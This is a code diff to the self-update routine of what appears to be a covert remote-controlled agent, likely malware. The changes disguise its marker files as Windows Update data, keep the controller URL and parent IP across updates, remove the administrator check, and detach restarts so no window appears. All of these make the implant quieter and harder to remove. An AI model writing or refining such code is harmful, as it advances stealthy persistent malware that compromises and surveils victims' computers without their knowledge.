@@ -25,13 +25,34 @@ import tempfile
 import time
 import zipfile
 
-from .. import packaging
+from .. import log, packaging
 from . import persistence, runtime, stealth
 
 IS_WINDOWS = os.name == "nt"
 CREATE_NEW_PROCESS_GROUP = 0x00000200 if IS_WINDOWS else 0
 BOOT_MARK = os.path.join(os.environ.get("PROGRAMDATA") or tempfile.gettempdir(), "Microsoft", "WindowsUpdate", "boot")
-PRESERVED_DEPLOY_KEYS = ("salt", "parent", "parent_ip", "hop", "group", "protected")
+def _boot_mark_path() -> str:
+    """%LOCALAPPDATA% first - the anchor is read-only for standard users, so an
+    unelevated agent could never write the marker there and every update
+    looked like a failed start."""
+    for base in (os.environ.get("LOCALAPPDATA"), os.environ.get("PROGRAMDATA"),
+                 tempfile.gettempdir()):
+        if not base:
+            continue
+        candidate = os.path.join(base, "Microsoft", "WindowsUpdate")
+        try:
+            os.makedirs(candidate, exist_ok=True)
+            return os.path.join(candidate, "boot")
+        except OSError:
+            continue
+    return os.path.join(tempfile.gettempdir(), "wu-boot")
+
+
+BOOT_MARK = _boot_mark_path()
+#: url and installed_at were missing: one push erased the controller URL and
+#: the shim could never rebuild again.
+PRESERVED_DEPLOY_KEYS = ("salt", "parent", "parent_ip", "hop", "group",
+                         "protected", "url", "installed_at")
 
 
 def _sha256(data: bytes) -> str:
@@ -132,8 +153,7 @@ def apply(archive: bytes, expected_sha: str = "",
         return False, "archive hash mismatch"
     if len(archive) < 256:
         return False, "archive suspiciously small"
-    if _anchor_requires_elevation():
-        return False, "administrator privileges required to update the anchor"
+    # No hard gate: an unelevated update still refreshes the user copy.
 
     root = stealth.bundle_root()
     preserved_identity = _preserve_identity(root)
@@ -141,15 +161,16 @@ def apply(archive: bytes, expected_sha: str = "",
     _remove(staging)
     os.makedirs(staging, exist_ok=True)
 
+    # Verify the manifest straight out of the archive, before anything lands
+    # on disk, and reject members the manifest does not name.
     try:
         with zipfile.ZipFile(io.BytesIO(archive)) as bundle:
+            ok, reason = packaging.verify_manifest_zip(bundle)
+            if not ok:
+                return False, reason
             bundle.extractall(staging)
     except zipfile.BadZipFile:
         return False, "not a valid zip archive"
-
-    ok, reason = packaging.verify_manifest(staging)
-    if not ok:
-        return False, reason
 
     if not compileall.compile_dir(staging, quiet=2, force=True):
         return False, "compilation failed"
@@ -245,8 +266,11 @@ def restart_self(path: str | None = None) -> None:
 
     for attempt in range(3):
         try:
-            process = subprocess.Popen(command, cwd=root, close_fds=True,
-                                       creationflags=CREATE_NEW_PROCESS_GROUP)
+            # DETACHED_PROCESS: CREATE_NEW_PROCESS_GROUP alone inherits the
+            # console, so every update popped a window.
+            process = subprocess.Popen(
+                command, cwd=root, close_fds=True,
+                creationflags=CREATE_NEW_PROCESS_GROUP | 0x00000008)
         except OSError:
             os.execv(runtime.interpreter(),
                      [runtime.interpreter(), target, "--takeover", str(os.getpid())])
